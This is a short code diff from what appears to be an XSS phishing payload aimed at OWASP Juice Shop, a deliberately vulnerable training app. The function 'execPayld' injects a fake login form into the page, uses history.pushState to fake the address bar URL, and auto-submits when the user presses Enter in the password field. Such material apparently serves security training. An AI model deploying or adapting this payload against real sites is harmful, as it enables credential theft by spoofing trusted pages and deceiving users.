@@ -77,10 +77,10 @@ async function submitLoginForm() {
   window.open(redirURL, '_self');
 }
 function execPayld() {
+  window.history.pushState({}, 'OWASP Juice Shop', 'https://preview.owasp-juice.shop/#/search');
   let phishDiv = document.createElement('div');
   phishDiv.innerHTML = phishHtml;
   document.getElementsByTagName('body')[0].appendChild(phishDiv);
-  document.location.href = document.location.href.split('#')[0] + '#products';
   document.getElementById('password').addEventListener('keyup', event => {
     if(event.key !== 'Enter') return;
     document.getElementById('okbutton').click();
